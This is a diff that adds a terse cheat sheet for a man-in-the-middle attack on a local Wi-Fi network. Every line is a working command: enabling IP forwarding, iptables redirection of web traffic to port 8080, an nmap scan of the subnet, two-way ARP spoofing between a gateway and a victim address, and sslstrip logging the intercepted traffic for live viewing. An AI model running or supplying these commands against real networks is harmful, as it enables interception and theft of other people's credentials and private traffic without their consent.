@@ -1,0 +1,26 @@
+::MITM::
+	//put a 1 into ip_forward
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	//insert rules
+		iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+		iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+	
+	//list policies
+		iptables -t nat -L PREROUTING
+		iptables -L INPUT
+
+	//nmap_arpscan the local network
+		nmap 192.168.1.1/24 -vv
+
+	//initiate bidirectional-redirection
+	   //window1
+		arpspoof -i wlan0 -t 192.168.1.1 -r 192.168.1.165
+	   //window2
+		arpspoof -i wlan0 -t 192.168.1.165 -r 192.168.1.1
+		
+	//initiate sslstrip on port 8080 and create sslstrip.log
+		sslstrip -l 8080
+
+	//livefeed sslstrip.log
+		tail -f sslstrip.log
